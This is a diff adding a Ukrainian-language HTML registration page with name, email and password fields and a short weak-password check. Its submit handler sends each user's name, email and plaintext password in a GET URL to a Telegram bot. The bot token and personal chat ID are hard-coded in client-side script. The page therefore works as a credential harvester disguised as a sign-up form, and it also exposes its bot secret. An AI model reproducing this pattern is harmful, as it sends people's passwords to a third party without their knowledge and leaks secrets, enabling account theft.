@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="uk">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Форма реєстрації</title>
+    <style>
+      body {
+        background-image: url(1366x768-7.jpg);
+        background-size: 100%;
+        background-repeat: no-repeat;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      #regForm {
+        margin-top: 16%;
+        background-color: rgba(255, 255, 255, 0.5);
+        display: flex;
+        flex-direction: column;
+        padding: 3%;
+        padding-top: 2%;
+        padding-bottom: 2%;
+        border-radius: 10px;
+        border: 2px solid black;
+      }
+      input {
+        margin: 2%;
+        width: 150px;
+        height: 25px;
+        border-radius: 5px;
+        border: 1px solid black;
+      }
+      h2 {
+        text-align: center;
+      }
+      button {
+        width: 130px;
+        height: 40px;
+        border-radius: 5px;
+        background-color: aquamarine;
+        text-align: center;
+        margin-top: 3%;
+        border: 1.5px solid black;
+      }
+      #passwordError {
+        color: red;
+        text-align: center;
+        display: none;
+        font-size: 14px;
+      }
+    </style>
+  </head>
+  <body>
+    <form id="regForm">
+      <h2>Реєстрація</h2>
+      <input type="text" id="name" placeholder="Ваше ім'я" required />
+      <input type="email" id="email" placeholder="Ваш Email" required />
+      <input type="password" id="password" placeholder="Ваш пароль" required />
+      <p id="passwordError"></p>
+      <center>
+        <button type="submit">Зареєструватися</button>
+      </center>
+    </form>
+
+    <script>
+      document
+        .getElementById("regForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          let name = document.getElementById("name").value;
+          let email = document.getElementById("email").value;
+          let password = document.getElementById("password").value;
+          let errorMsg = document.getElementById("passwordError");
+
+          // Список занадто простих паролів
+          let weakPasswords = [
+            "123456",
+            "123123",
+            "password",
+            "qwerty",
+            "111111",
+            "abcdef",
+            "654321",
+            "000000",
+          ];
+
+          if (weakPasswords.includes(password.toLowerCase())) {
+            errorMsg.style.display = "block";
+            errorMsg.textContent =
+              "Цей пароль занадто простий! Оберіть складніший.";
+            return; // Зупиняємо подальше виконання
+          } else {
+            errorMsg.style.display = "none";
+          }
+
+          let message = `📩 Нова реєстрація!\n👤 Ім'я: ${name}\n📧 Email: ${email}\n🔑 Пароль: ${password}`;
+
+          let botToken = "7702986276:AAHJxqzwGGvIRLGrxPC4MJn6mpcGYhdJxAE"; // Токен бота
+          let chatId = "1781713521"; // Твій Telegram ID
+
+          let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+          )}`;
+
+          fetch(url)
+            .then((response) => response.json())
+            .then((data) => {
+              if (data.ok) {
+                alert("Реєстрація пройшла успішно!");
+                document.getElementById("regForm").reset(); // Очищення форми після успішної реєстрації
+                window.location.href = "index2.html"; // Перекидання на index2.html
+              } else {
+                alert("Щось пішло не так");
+              }
+            })
+            .catch((error) => console.error("Помилка:", error));
+        });
+    </script>
+  </body>
+</html>
